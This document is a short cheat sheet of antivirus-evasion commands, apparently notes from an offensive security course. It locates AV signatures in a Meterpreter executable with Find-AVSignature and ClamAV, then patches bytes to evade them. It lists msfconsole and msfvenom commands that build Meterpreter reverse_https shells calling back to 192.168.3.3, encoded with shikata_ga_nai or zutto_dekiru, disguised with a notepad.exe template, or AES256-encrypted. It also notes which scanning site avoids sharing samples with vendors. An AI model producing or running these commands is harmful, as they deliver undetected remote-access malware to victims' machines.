# Simulaing the target
https://www.virustotal.com - Distributes findings to all vendors
https://aniscan.me - Doesn't distribute but scans against only 26 vendors

# Locating Signatures in Files
## Preparation
Disable Real-Time scanning for ClamAV
## Split Malicious file into pieces
| Info | Command |
|:-----|:--------|
| Import Find-AVSignature Module | `Import-Module .\Find-AVSignature.ps1` |
| Split Executeable | `Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force` |

## Scan with ClamAV
cd 'C:\Program Files\clamav'
.\clamscan.exe C:\tools\avtest1\


Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force


Find-AVSignature -StartByte 14000 -EndByte 15000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force

## Replace some bytes with zero
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[14430] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met.exe", $bytes)
```

sudo msfconsole -q -x "use exploit/multihandler; set PAYLOAD windows/meterpreter/reverse_http; set LHOST 192.168.3.3; set LPORT 443; exploit"

## Bypassing Antivirus with Metasploit
### Metasploit Encoders
| Info | Command |
|:-----|:--------|
| List available encoders | `msfvenom --list encoders` |
| Shikata Ga Nai encoding| `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.3.3 LPORT=443 -e x86/shikata_ga_nai -f exe -o /home/kali/share/shell.exe` |
| x64 Shell No encoding | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.3.3 LPORT=443 -f exe -o /home/kali/share/shell.exe` |
| x64 Shell Zutto Dekiru encoding | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.3.3 LPORT=443 -e x64/zutto_dekiru -f exe -o /home/kali/share/shell.exe` |
| Use notepad as a Zutto Dekiru template | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.3.3 LPORT=443 -e x64_zutto_dekiru -x /home/kali/share/notepad.exe -f exe -o /home/kali/share/shell.exe ` |

### Metasploit Encryptors
| Info | Command |
|:-----|:--------|
| List available encrypters | `msfvenom --list encrypt` |
| Generate AES256 encrypted payload | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.3.3 LPORT=443 --encrypt aes256 --encrypt-key asdfasdfasdfasdf -f exe -o /home/kali/share/shell.exe` |
